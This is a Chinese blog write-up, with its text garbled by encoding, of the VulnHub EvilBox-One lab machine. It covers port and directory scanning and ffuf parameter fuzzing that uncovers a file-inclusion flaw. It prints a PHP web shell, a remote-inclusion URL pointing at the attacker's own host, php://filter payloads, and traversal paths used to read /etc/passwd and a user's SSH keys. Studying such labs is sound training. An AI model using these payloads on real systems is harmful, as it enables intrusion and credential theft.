<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> VulnHub-6-EvilBox-one Â· Patrik's Blog</title><meta name="description" content="VulnHub-6-EvilBox-one - Patrik"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Patrik's Blog"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Patrik's Blog" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://www.bing.com" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">VulnHub-6-EvilBox-one</h1><div class="post-info">2022å¹´1æœˆ14æ—¥</div><div class="post-content"><span id="more"></span>
<blockquote>
<p>é¶æœºä¿¡æ¯ <a target="_blank" rel="noopener" href="https://download.vulnhub.com/evilbox/EvilBox---One.ova">https://download.vulnhub.com/evilbox/EvilBox---One.ova</a></p>
</blockquote>
<h3 id="1-ä¸»æœºå‘ç°"><a href="#1-ä¸»æœºå‘ç°" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig </span><br><span class="line">#æœ¬æœºIP:192.168.0.110 æ”»å‡»æœºIP</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208193627499-20220106215922469-20220106220051089-20220106221119106.png" alt="image-20211208193627499"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -gaq 192.168.0.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208195647496.png" alt="image-20211208195647496"></p>
<p>æ¢æµ‹åˆ°çš„å­˜æ´»ä¸»æœºåˆ—è¡¨ä¸­ï¼Œ192.168.0.108æ˜¯ç›®æ ‡é¶æœºçš„IPåœ°å€</p>
<h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.0.108</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208195931120.png" alt="image-20211208195931120"></p>
<p>ç›®æ ‡é¶æœºå¼€æ”¾äº†22ï¼Œ80ç«¯å£</p>
<h3 id="3-ç«¯å£æœåŠ¡æ¢æµ‹"><a href="#3-ç«¯å£æœåŠ¡æ¢æµ‹" class="headerlink" title="3.ç«¯å£æœåŠ¡æ¢æµ‹"></a>3.ç«¯å£æœåŠ¡æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80 -A 192.168.0.108</span><br><span class="line"># -Aå‚æ•°çš„ä½œç”¨å¤§è‡´ç­‰äº-sV -sC -O,æ¯”è¾ƒæ–¹ä¾¿</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208200300990.png" alt="image-20211208200300990"></p>
<p>æ‰«æç»“æœæ˜¾ç¤ºç›®æ ‡é¶æœºçš„</p>
<p>22ç«¯å£å¼€æ”¾äº†sshæœåŠ¡ï¼Œå¹¶åˆ—ä¸¾äº†äº›ä¸åŒæ–¹å¼åŠ å¯†çš„å¯†é’¥ä¿¡æ¯</p>
<p>80ç«¯å£å¼€æ”¾äº†Apacheçš„WebæœåŠ¡ï¼ŒDebianæ“ä½œç³»ç»Ÿ</p>
<h3 id="4-è®¿é—®80ç«¯å£"><a href="#4-è®¿é—®80ç«¯å£" class="headerlink" title="4.è®¿é—®80ç«¯å£"></a>4.è®¿é—®80ç«¯å£</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208200757525.png" alt="image-20211208200757525"></p>
<p>åªæ˜¯ä¸€ä¸ªç®€å•çš„Apacheé¡µé¢ï¼Œæœªå‘ç°æœ‰ç”¨ä¿¡æ¯</p>
<h3 id="5-çˆ†ç ´22ç«¯å£"><a href="#5-çˆ†ç ´22ç«¯å£" class="headerlink" title="5.çˆ†ç ´22ç«¯å£"></a>5.çˆ†ç ´22ç«¯å£</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208201510674.png" alt="image-20211208201510674"></p>
<p>å¯¹22ç«¯å£rootç”¨æˆ·çš„å¯†ç è¿›è¡Œäº†çˆ†ç ´ ä½†æœ€ç»ˆæ— æœ</p>
<h3 id="6-ç›®å½•æ‰«æ"><a href="#6-ç›®å½•æ‰«æ" class="headerlink" title="6.ç›®å½•æ‰«æ"></a>6.ç›®å½•æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204109760.png" alt="image-20211208204109760"></p>
<p>å‘ç°çš„ç›®å½•&#x2F;æ–‡ä»¶æœ‰ index.html,robots.txt,secret åˆ†åˆ«å°è¯•ï¼š</p>
<h4 id="1-ip-x2F-index-html"><a href="#1-ip-x2F-index-html" class="headerlink" title="1)ip&#x2F;index.html"></a>1)ip&#x2F;index.html</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208203719626.png" alt="image-20211208203719626"></p>
<p>ä¸»é¡µäº¦æ˜¯å…ˆå‰çš„80ç«¯å£é»˜è®¤é¡µé¢..</p>
<h4 id="2-ip-x2F-robots-txt"><a href="#2-ip-x2F-robots-txt" class="headerlink" title="2)ip&#x2F;robots.txt"></a>2)ip&#x2F;robots.txt</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208201957960.png" alt="image-20211208201957960"></p>
<p>é¡µé¢å†…æ˜¾ç¤ºäº†â€œHello H4x0râ€ï¼Œæ€€ç–‘æ˜¯å¦æ˜¯ç”¨æˆ·åæˆ–è€…è·¯å¾„ï¼Œå°è¯•é’ˆå¯¹ç”¨æˆ·åH4x0rçš„sshå¯†ç çˆ†ç ´ï¼Œç»“æœå¤±è´¥..</p>
<p>å°è¯•è®¿é—®ip&#x2F;H4x0rç»“æœä¹Ÿæ˜¯å¤±è´¥..</p>
<h4 id="3-ip-x2F-secret"><a href="#3-ip-x2F-secret" class="headerlink" title="3)ip&#x2F;secret"></a>3)ip&#x2F;secret</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208203843733.png" alt="image-20211208203843733"></p>
<p>è®¿é—®åå‘ç°æ˜¯ä¸ªç©ºç›®å½•ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä»»ä½•ä¿¡æ¯..</p>
<p>å†å¯¹ip&#x2F;secretä¸‹çš„ç›®å½•è¿›è¡Œæ‰«æ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204358197.png" alt="image-20211208204358197"></p>
<p>å‘ç°äº†&#x2F;secretç›®å½•ä¸‹çš„index.htmlï¼Œevil.php åˆ†åˆ«å°è¯•ï¼š</p>
<h4 id="4-ip-x2F-secret-x2F-index-html"><a href="#4-ip-x2F-secret-x2F-index-html" class="headerlink" title="4)ip&#x2F;secret&#x2F;index.html"></a>4)ip&#x2F;secret&#x2F;index.html</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204647211.png" alt="image-20211208204647211"></p>
<p>ç©ºç™½ğŸ˜±..</p>
<h4 id="5-ip-x2F-secret-x2F-evil-php"><a href="#5-ip-x2F-secret-x2F-evil-php" class="headerlink" title="5)ip&#x2F;secret&#x2F;evil.php"></a>5)ip&#x2F;secret&#x2F;evil.php</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208204721125.png" alt="image-20211208204721125"></p>
<p>ç©ºç™½ğŸ˜±..</p>
<p>æˆªæ­¢åˆ°ç›®å‰ï¼Œè¿˜æ²¡æœ‰ä»»ä½•ç›´æ¥çš„å‘ç°ï¼Œåœç•™åœ¨æ­¤..ğŸ˜®â€ğŸ’¨</p>
<h3 id="7-ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´"><a href="#7-ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´" class="headerlink" title="7.ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´"></a>7.ç»å¢ƒçš„æ±‚æ•‘ä¿¡â€“phpå‚æ•°çˆ†ç ´</h3><p>æ€è€ƒğŸ¤”ï¼šphpé¡µé¢æ˜¯å¦‚ä½•å‘æœåŠ¡å™¨ç«¯æäº¤æ•°æ®çš„å‘¢ï¼Ÿ</p>
<p>Emm:é€šè¿‡ä¸€äº›å‚æ•°èµ‹å€¼</p>
<p><a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?**a=123&amp;b=456">http://192.168.0.108/secret/evil.php?**a=123&amp;b=456</a>**</p>
<p>å›å¿†ğŸ¤”ï¼šå¹³æ—¶åšæ”»å‡»ã€æ³¨å…¥ç­‰æ—¶çš„å¤§è‡´æ­¥éª¤éƒ½æ˜¯ï¼Œåœ¨URLå…ˆå¯»æ‰¾å‚æ•°åç§°ï¼Œå†å°è¯•å†™å…¥payloadå®Œæˆæ³¨å…¥ï¼ŒåŒ…æ‹¬ä½¿ç”¨POSTæ–¹æ³•ä¹Ÿæ˜¯å¯»æ‰¾å‚æ•°åœ¨bodyé‡Œå¯»æ‰¾æ•°æ®æ³¨å…¥</p>
<p>ğŸ’Šå¾—æ•‘çš„å…³é”®å°±æ˜¯â€“&gt;<strong>å¯»æ‰¾æ­£ç¡®çš„å‚æ•°</strong>â€“&gt;<strong>å‚æ•°çˆ†ç ´</strong>ï¼ï¼ï¼ğŸ’£</p>
<p>ç¡®å®šç›®æ ‡ï¼š</p>
<p><a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?**cs**=**csz">http://192.168.0.108/secret/evil.php?**cs**=**csz</a>**</p>
<p>å¯¹<strong>å‚æ•°åä½ç½®</strong>(cs)å’Œ<strong>å‚æ•°å€¼ä½ç½®</strong>(csz)</p>
<p>å·¥å…·é€‰æ‹©ï¼š</p>
<p>ç¬¬ä¸€ååº”æ˜¯bpï¼Œä½†æ˜¯è¿™é‡Œä¸ºäº†æ‹“å±•æ­¦å™¨é€‰æ‹©ä½¿ç”¨ffuf</p>
<p>å­—å…¸é€‰æ‹©ï¼š</p>
<p>â€‹	é’ˆå¯¹å‚æ•°åé€‰æ‹©burp-parameter-names.txt</p>
<p>â€‹	é’ˆå¯¹å‚æ•°å€¼é€‰æ‹©DIYå¤§æ³•ğŸ¸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi DIY.txt #æ”¾å…¥ä¸€äº›æ•°å­—ã€å­—æ¯ã€ç¬¦å·</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat DIY.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208211435869.png" alt="image-20211208211435869"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:cs -w DIY.txt:csz -u http://192.168.0.108/secret/evil.php?cs=csz -fs 0</span><br><span class="line">#-wåˆ†åˆ«æŒ‡å®šä¸¤ä¸ªå­—å…¸  </span><br><span class="line">#:ä¸ºäº†åŒºåˆ†å­—å…¸ï¼ŒæŒ‡å®šå‚æ•°</span><br><span class="line">#-fs 0 è¿‡æ»¤æ‰æ— æ•ˆä¿¡æ¯ï¼ˆè¿”å›é¡µé¢ä¸ºç©º 0ï¼‰ï¼Œä½¿ç»“æœæ›´æ¸…æ™°æ˜“è¯»</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208213846947.png" alt="image-20211208213846947"></p>
<p>ç»“æœå¾ˆä¸ç†æƒ³..ğŸ˜«</p>
<p>åˆ†æä¸€ä¸‹ï¼š</p>
<p>åˆšæ‰çš„å‚æ•°åå­—å…¸ä¸­åº”è¯¥æ˜¯æ¶µç›–äº†å¤§éƒ¨åˆ†å¸¸ç”¨å‚æ•°å åº”è¯¥ä¸å­˜åœ¨ç›´æ¥é—®é¢˜âœ…</p>
<p>åˆšæ‰çš„èµ‹å€¼å­—å…¸æ˜¯æ‰‹åŠ¨è¾“å…¥äº†å‡ ä¸ªå­—æ¯ã€æ•°å­—ã€ç¬¦å· æ€€ç–‘æ˜¯è¿™é‡Œæ‰äº†é“¾å­âŒ</p>
<p>ç¨å¾®å˜æ¢ä¸€ä¸‹æ€è·¯ï¼š</p>
<p>åœ¨å‚æ•°åçš„ä½ç½®ä»ä½¿ç”¨burp-parameter-names.txtå­—å…¸ï¼Œå‚æ•°å€¼çš„ä½ç½®æ”¾ç½®ä¸€ä¸ªç›®æ ‡é¶æœºä¸Š<strong>å·²ç»ç¡®å®šå­˜åœ¨çš„æ–‡ä»¶</strong>ï¼Œå½“åœ¨çˆ†ç ´å‚æ•°åçš„è¿‡ç¨‹ä¸­è‹¥å‡ºç°äº†ä¸€ä¸ªå¯ç”¨çš„å‚æ•°åæ—¶ï¼Œé‚£ä¹ˆè¯¥å‚æ•°ä¾¿ä¼šå¼•ç”¨è¯¥<strong>å·²ç»ç¡®å®šå­˜åœ¨çš„æ–‡ä»¶</strong>ï¼Œæ˜¯å¦æœ‰å¯èƒ½åˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»å–æ–‡ä»¶çš„ä¿¡æ¯ï¼Ÿ</p>
<p>ç»“åˆä¹‹å‰çš„ç›®å½•æ‰«æï¼Œä¸éš¾æƒ³åˆ°è¿™ä¸ª<strong>å·²ç»ç¡®å®šå­˜åœ¨çš„æ–‡ä»¶</strong>ä¸å°±æ˜¯<strong>index.html</strong>å—ï¼Ÿ</p>
<p>é‡æ–°æ„å»ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.108/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line">#å–æ¶ˆå‚æ•°å€¼çš„å­—å…¸ æ›¿æ¢ä¸º../index.html</span><br><span class="line">#FUZZæ¨¡ç³Šæµ‹è¯•å…³é”®å­—</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208213756058.png" alt="image-20211208213756058"></p>
<p>ç»“æœæ˜¾ç¤ºï¼šå‚æ•°åç§°commandå¯ç”¨</p>
<p>æµ‹è¯•è®¿é—®<a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?command=../index.html">http://192.168.0.108/secret/evil.php?command=../index.html</a></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208214129645.png" alt="image-20211208214129645"></p>
<p>å¯ä»¥æ­£å¸¸è®¿é—®</p>
<p>æµ‹è¯•è®¿é—®<a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?command=evil.php">http://192.168.0.108/secret/evil.php?command=evil.php</a></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208214243394.png" alt="image-20211208214243394"></p>
<p>è®¿é—®ç»“æœä»ä¸ºç©ºç™½é¡µé¢ï¼ŒæŸ¥çœ‹æºç ä¸º1è¡Œç©ºç™½</p>
<p>æµ‹è¯•æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>è®¿é—®<a target="_blank" rel="noopener" href="http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd">http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd</a></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208214549193.png" alt="image-20211208214549193"></p>
<p>ç»“æœæˆåŠŸè¯»å–&#x2F;etc&#x2F;passwdï¼Œè¯´æ˜å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<h3 id="8-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#8-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="8.è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>8.è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p>å°è¯•åœ¨kaliæ”»å‡»æœºä¸Šæ„é€ ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.php</span><br></pre></td></tr></table></figure>

<blockquote>
<?php $var=shell_exec($_GET['cmd']); echo $var?>
</blockquote>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208215246492.png" alt="image-20211208215246492"></p>
<p>åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«ä¸Šä¼ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start apache2 #åœ¨kaliæœ¬æœºå¼€å¯webæœåŠ¡ å¯åœ¨æ‰§è¡Œå ä½¿ç›®æ ‡å¯ä»¥è®¿é—®åˆ°a.php</span><br></pre></td></tr></table></figure>



<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208215647665.png" alt="image-20211208215647665"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=http://192.168.0.110/a.php?cmd=id</span><br><span class="line">#å°è¯•æ‰§è¡Œidå‘½ä»¤</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208220144981.png" alt="image-20211208220144981"></p>
<p>å¹¶æ²¡æœ‰è¿”å›ï¼Œå°è¯•äº†lsç­‰å…¶ä»–å‘½ä»¤ä¹Ÿæ²¡æœ‰è¿”å›ï¼Œè¯´æ˜æ­¤å¤„åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ˜¯è¡Œä¸é€šçš„</p>
<h3 id="9-phpå°è£…å™¨"><a href="#9-phpå°è£…å™¨" class="headerlink" title="9.phpå°è£…å™¨"></a>9.phpå°è£…å™¨</h3><p>phpä½œä¸ºä¸€ç§è¯­è¨€ï¼Œæä¾›è®¸å¤šå…¶ä»–åè®®çš„è®¿é—®æ–¹å¼ã€è®¸å¤šå°è£…å™¨ï¼Œä¾‹å¦‚php:&#x2F;&#x2F; file:&#x2F;&#x2F; ftp:&#x2F;&#x2F; data:&#x2F;&#x2F; zip:&#x2F;&#x2F;</p>
<p>åˆ©ç”¨php:&#x2F;&#x2F;æ¥è¯»å–ç›®æ ‡ç³»ç»Ÿä¸Šçš„phpæ–‡ä»¶ï¼ˆå½“è®¿é—®ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„phpæ–‡ä»¶æ—¶ï¼Œç›®æ ‡æœåŠ¡å™¨ä¼šä½¿ç”¨phpæ‰§è¡Œä»£ç æ¥å¤„ç†è¯¥æ–‡ä»¶ï¼Œæ•…å¾€å¾€è¯»å–ä¸åˆ°phpæ–‡ä»¶çš„æºç ï¼Œè¯»åˆ°çš„åªæ˜¯ä»£ç æ‰§è¡Œåè¿”å›çš„ç»“æœã€‚ä½†è‹¥æ˜¯å…ˆä½¿ç”¨base64è¿›è¡Œç¼–ç åï¼Œç›®æ ‡æœåŠ¡å™¨æ— æ³•æ­£å¸¸è¯»å–å¯è¯†åˆ«çš„ä»£ç ï¼Œä¸ä½†ä¸ä¼šæ‰§è¡Œè¯¥ä»£ç ï¼Œåè€Œä¼šè¿”å›è¢«base64ç¼–ç åçš„å­—ç¬¦ä¸²ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208221355954.png" alt="image-20211208221355954"></p>
<p>æˆåŠŸè¿”å›base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼ˆevil.phpæºç ï¼‰</p>
<blockquote>
<p>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg&#x3D;&#x3D;</p>
</blockquote>
<p>base64è§£ç åï¼š</p>
<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208221618439.png" alt="image-20211208221618439"></p>
<blockquote>
<?php
$filename = $_GET['command'];   #è¯»å–èµ‹å€¼
include($filename);             #å¼•ç”¨è¯»å–åˆ°çš„èµ‹å€¼
?>
</blockquote>
<p>æµ‹è¯•å‘ç›®æ ‡å†™å…¥èƒ½å¦æˆåŠŸï¼Œå¯èƒ½æ²¡æœ‰å†™å…¥çš„æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n 123 | base64       #å¾—åˆ°123ç»è¿‡base64ç¼–ç çš„å­—ç¬¦</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208222226443.png" alt="image-20211208222226443"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz</span><br><span class="line">#åˆ©ç”¨php://å°è£…å™¨å°†MTIzè§£ç åå†™å…¥åä¸ºtest.phpçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208222639627.png" alt="image-20211208222639627"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208222705794.png" alt="image-20211208222705794"></p>
<p>è®¿é—®å¤±è´¥ è¯´æ˜åˆšæ‰çš„å†™å…¥æ“ä½œå¤±è´¥äº†..å†æ¬¡é™·å…¥åƒµå±€..</p>
<h3 id="10-mowree"><a href="#10-mowree" class="headerlink" title="10.mowree?"></a>10.mowree?</h3><p>åˆé‡æ–°ç¿»çœ‹äº†ä¹‹å‰æœé›†åˆ°çš„ä¿¡æ¯ï¼Œå‘ç°åœ¨&#x2F;etc&#x2F;passwdç›®å½•ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ªåä¸ºmowreeçš„ç”¨æˆ·</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223113476.png" alt="image-20211208223113476"></p>
<p>åªæœ‰ç”¨æˆ·åï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥å†å°è¯•ä¸€ä¸‹sshç™»é™†å¯†ç çˆ†ç ´ï¼Ÿ</p>
<p>å…ˆç¡®è®¤ä¸€ä¸‹sshç™»é™†çš„è®¤è¯æ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -v</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223554832.png" alt="image-20211208223554832"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223639905.png" alt="image-20211208223639905"></p>
<p>ç»“æœæ˜¾ç¤ºç›®æ ‡æ”¯æŒpasswordå¯†ç è®¤è¯ä»¥å¤–ï¼Œè¿˜æ”¯æŒpublickeyå…¬é’¥èº«ä»½è®¤è¯</p>
<p>é‚£ä¹ˆè”æƒ³åˆ° ä¸€ä¸ªèƒ½å¤Ÿç™»é™†è¯¥æœåŠ¡å™¨çš„çš„ç”¨æˆ·å¿…ç„¶å­˜åœ¨å…¶ç™»é™†æ‰€ç”¨çš„å…¬é’¥,é‚£ä¹ˆè¯¥å…¬é’¥æ–‡ä»¶ä½äºå“ªé‡Œå‘¢ï¼Ÿ</p>
<p>æ˜¯å¦å­˜åœ¨äºç”¨æˆ·ç›®å½•æ–‡ä»¶ä¸‹å‘¢ï¼Ÿç»“åˆåˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»æ–‡ä»¶ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/authorized_keys</span><br><span class="line">#.ssh/authorized_keys å·²ç»æˆæƒçš„ç”¨æˆ·çš„é»˜è®¤å…¬é’¥å­˜å‚¨è·¯å¾„</span><br></pre></td></tr></table></figure>

<p>å¦‚æœèƒ½å¤Ÿè¯»å–åˆ°åˆ™è¯´æ˜æœåŠ¡å™¨æ˜¯å·²æˆæƒå…è®¸è¯¥ç”¨æˆ·ç™»é™†çš„</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208225112071.png" alt="image-20211208225112071"></p>
<p>æˆåŠŸè¯»å–åˆ°å­˜æ”¾åœ¨ç›®æ ‡ç”¨æˆ·mowreeç›®å½•ä¸‹çš„å…¬é’¥</p>
<blockquote>
<p>ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud&#x2F;knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV&#x2F;QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH&#x2F;XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</p>
</blockquote>
<p>é¡µé¢è¿”å›ä¿¡æ¯ï¼šå…¬ç§é’¥ç”Ÿæˆä½¿ç”¨RSAç®—æ³•ã€ç”¨æˆ·mowreeç™»å½•åˆ°EvilBoxOne</p>
<p>æ—¢ç„¶å·²ç»è¢«æˆæƒâ€“å­˜åœ¨å…¬é’¥â€“é‚£ä¹ˆæ˜¯å¦ä¹Ÿåº”è¯¥åœ¨é»˜è®¤ç›®å½•ä¸‹å­˜åœ¨ç§é’¥å‘¢ï¼Ÿ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa</span><br><span class="line">#.ssh/id_rsa å·²ç»æˆæƒçš„ç”¨æˆ·çš„é»˜è®¤ç§é’¥å­˜å‚¨è·¯å¾„</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208225724998.png" alt="image-20211208225724998"></p>
